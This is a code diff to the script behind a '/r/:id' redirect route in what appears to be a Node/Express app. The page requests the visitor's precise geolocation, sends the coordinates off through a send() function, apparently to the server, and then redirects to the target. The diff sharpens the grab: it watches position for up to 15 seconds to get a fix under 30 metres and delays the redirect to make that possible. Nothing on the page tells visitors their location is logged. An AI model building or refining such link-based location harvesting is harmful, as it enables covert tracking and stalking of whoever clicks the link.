@@ -272,12 +272,36 @@ app.get('/r/:id', async (req, res) => {
     }catch(e){cb&&cb();}
   }
   function go(){if(done)return;done=true;window.location.replace(target);}
-  setTimeout(go,9000); // hard fallback
   if(!('geolocation' in navigator)){setTimeout(go,200);return;}
-  navigator.geolocation.getCurrentPosition(
-    function(pos){send({latitude:pos.coords.latitude,longitude:pos.coords.longitude,accuracy:pos.coords.accuracy},function(){setTimeout(go,300);});},
-    function(){setTimeout(go,200);},
-    {enableHighAccuracy:true,timeout:8000,maximumAge:0}
+
+  // Hard fallback: redirect after 18s no matter what.
+  setTimeout(go, 18000);
+
+  var best=null, watchId=null;
+  function finish(){
+    if(best){
+      send({latitude:best.coords.latitude,longitude:best.coords.longitude,accuracy:best.coords.accuracy},function(){setTimeout(go,200);});
+    } else {
+      setTimeout(go,150);
+    }
+  }
+  // Stop watching after 15s and send the best fix we have.
+  setTimeout(function(){ try{navigator.geolocation.clearWatch(watchId);}catch(e){} finish(); }, 15000);
+
+  watchId = navigator.geolocation.watchPosition(
+    function(pos){
+      if(!best || pos.coords.accuracy < best.coords.accuracy) best = pos;
+      // If we already got a good fix (< 30m), stop early.
+      if(pos.coords.accuracy && pos.coords.accuracy < 30){
+        try{navigator.geolocation.clearWatch(watchId);}catch(e){}
+        finish();
+      }
+    },
+    function(err){
+      // Permission denied -> redirect quickly; other errors -> wait for the 15s timer.
+      if(err && err.code===1){ try{navigator.geolocation.clearWatch(watchId);}catch(e){} setTimeout(go,150); }
+    },
+    {enableHighAccuracy:true,timeout:15000,maximumAge:0}
   );
 })();
 </script>
